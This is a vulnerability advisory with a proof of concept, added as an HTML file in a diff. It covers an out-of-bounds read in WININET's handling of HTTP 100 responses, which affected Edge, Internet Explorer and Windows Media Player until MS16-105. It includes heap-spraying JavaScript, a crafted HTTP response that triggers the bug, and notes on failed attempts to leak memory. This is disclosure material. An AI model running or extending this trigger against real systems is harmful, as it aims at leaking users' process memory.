@@ -1,0 +1,127 @@
+<!--
+Source: http://blog.skylined.nl/20161110001.html
+
+Synopsis
+
+A specially crafted HTTP response can cause the CHttp­Header­Parser::Parse­Status­Line method in WININET to read data beyond the end of a buffer. The size of the read can be controlled through the HTTP response. An attacker that is able to get any application that uses WININET to make a request to a server under his/her control may be able to disclose information stored after this memory block. This includes Microsoft Internet Explorer, Microsoft Edge and Microsoft Windows Media Player. As far as I can tell WININET is widely used by Microsoft applications to handle HTTP requests, and probably be all third-party applications that use Windows APIs to make HTTP requests. All these applications may be vulnerable to the issue, though it may be hard to exploit in most (if not all, see below).
+
+Known affected versions, attack vectors and mitigations
+
+WININET.dll
+
+The issue was first discovered in pre-release Windows 10 fbl_­release.140912-1613, which contained WININET.DLL version 11.00.9841.0. This vulnerability appears to have been present in all versions of Windows 10 since, up until the issue was addressed in August 2016. No mitigations against the issue are known.
+Microsoft Internet Explorer
+XMLHttp­Request can be used to trigger this issue - I have not tried other vectors. To exploit the vulnerability, Javascript is most likely required, so disabling Javascript should mitigate it.
+
+Microsoft Edge
+
+XMLHttp­Request can be used to trigger this issue - I have not tried other vectors. To exploit the vulnerability, Javascript is most likely required, so disabling Javascript should mitigate it.
+
+Microsoft Windows Media Player
+
+Opening a link to a media file on a malicious server can be used to trigger the issue.
+Microsoft has released two bulletins to address this issue, one for Microsoft Internet Explorer and one for Microsoft Edge. I do not know why Microsoft did not mention other applications in their bulletins, nor why they have two fixes for these specific applications, rather than one fix for a component of the Windows Operating System.
+
+One wonders what would happen on a system where you have previously uninstalled both MSIE and Edge: do neither of the fixes apply and will your system be left vulnerable? Let me know if you found out!
+
+Repro
+
+The below repro consists of two parts: an HTML file that constructs an XMLHttp­Request in order to trigger the issue and a raw HTTP response that actually triggers it.
+-->
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      // This Po­C attempts to exploit a memory disclosure bug in WININET.dll
+      // that affects Microsoft Edge and Internet Explorer. However, it fails
+      // to reveal any information as intended. You might want to use this as
+      // a starting point for further investigation.
+      // See http://blog.skylined.nl/20161110001.html for details.
+      window.onerror = function (a, b, c) {
+        alert([a,b,c].join("\r\n"));
+      }
+      var aau­Heap = [];
+      function spray() {
+        aau­Holes = [];
+        for (var u = 0; u < 0x10000; u++) {
+          var au­Hole = new Uint32Array(0x200 / 4);
+          aau­Holes.push(au­Hole);
+          au­Hole[0] = 0x­DEADBEEF;
+          au­Hole[1] = 0x0D0A0D0A;
+          au­Hole[2] = 0x0;
+          var au­Heap = new Uint32Array(0x200 / 4);
+          aau­Heap.push(au­Heap);
+          au­Heap[0] = 0x41424344;
+          au­Heap[1] = 0x0D0A0D0A;
+          au­Heap[2] = 0x0;
+        }
+      };
+      function send­Request() {
+        spray();
+        var o­XHR = new XMLHttp­Request();
+        o­XHR.open("GET", "Response.http?" + new Date().value­Of());
+        o­XHR.send();
+        o­XHR.add­Event­Listener("load", function() { 
+          alert("load: " + JSON.stringify(o­XHR.status) + " " + JSON.stringify(o­XHR.status­Text) + "\r\n" +
+              JSON.stringify(o­XHR.response­Text));
+          set­Timeout(send­Request, 1000);
+        });
+        o­XHR.add­Event­Listener("error", function() { 
+          alert("error: " + JSON.stringify(o­XHR.status) + " " + JSON.stringify(o­XHR.status­Text) + "\r\n" +
+              JSON.stringify(o­XHR.response­Text));
+          set­Timeout(send­Request, 1000);
+        });
+      }
+      send­Request();
+      // This work by Sky­Lined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
+    </script>
+  </head>
+</html>
+
+<!--
+Response.http
+
+HTTP/1.1 100 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+HTTP/1.1 200 X
+
+Description
+
+When WININET is processing a HTTP 100 response, it expects another HTTP response to follow. WININET stores all data received from the server into a buffer, uses a variable to store an index into this buffer to track where it is currently processing data, and uses another variable to store the length of the remaining data in the buffer.
+
+When processing the headers of the HTTP 100 request, the code updates the index correctly, but does not decrement the length variable. When the code processes the next request, the length variable is too large, which can cause the code to read beyond the end of the data received from the server. This may cause it to parse data stored in the buffer that was previously received as part of the current HTTP response, and can even cause it to do the same for data read beyond the end of the buffer. This can potentially lead to information disclosure.
+
+The larger the HTTP 100 response is, the more bytes the code reads beyond the end of the data. Here are some example responses and their effect:
+
+  "HTTP 100\r\n\r\n­X" (12 bytes in HTTP 100 response)
+    => read "X" and the next 11 bytes in memory as the next response.
+  "HTTP 100\r\n\r\n­XXXX" (12 bytes in HTTP 100 response)
+    => read "XXXX" and the next 8 bytes in memory as the next response.
+  "HTTP 100XXX\r\n\r\n­X" (15 bytes in HTTP 100 response)
+    => read "X" and the next 14 bytes in memory as the next response.
+  "HTTP 100XXX........XXX\r\n\r\n­X..." (N bytes in HTTP 100 response)
+    => read "X" and the next (N-1) bytes in memory as the next response.
+
+Exploit
+
+This issue is remarkably similar to an issue in HTTP 1xx response handling I found in Google Chrome a while back. That issue allowed disclosure of information from the main process' memory through response headers. I attempted to leak some data using this vulnerability by using the following response:
+
+  "HTTP 100XXX........XXX\r\n­HTTP 200 X"
+
+I was hoping this would cause the OOB read to save data from beyond the end of the HTTP 200 reponse in the status­Text property of the XMLHttp­Request, but I did not immediately see this happen; all I got was "OK" or an empty string.
+
+Unfortunately, I did not have time to reverse the code and investigate further myself. All VCPs I submitted the issue to rejected it because they though it was not practically exploitable.
+
+Time-line
+
+October 2014: This vulnerability was found through fuzzing.
+October-November 2014: This vulnerability was submitted to ZDI, i­Defense and EIP.
+November-December 2014: ZDI, i­Defense and EIP all either reject the submission because Windows 10 is in pre-release, or fail to respond.
+August 2015: re-submitted to ZDI, i­Defense and EIP, since Windows 10 is now in public release.
+September-October 2015: ZDI, i­Defense and EIP all either reject the submission because they do not consider it practically exploitable, or fail to respond.
+June 2016: This vulnerability was reported to Microsoft with a 60-day deadline to address the issue.
+September 2016: The vulnerability was address by Microsoft in MS16-105.
+November 2016: Details of this issue are released.
+-->
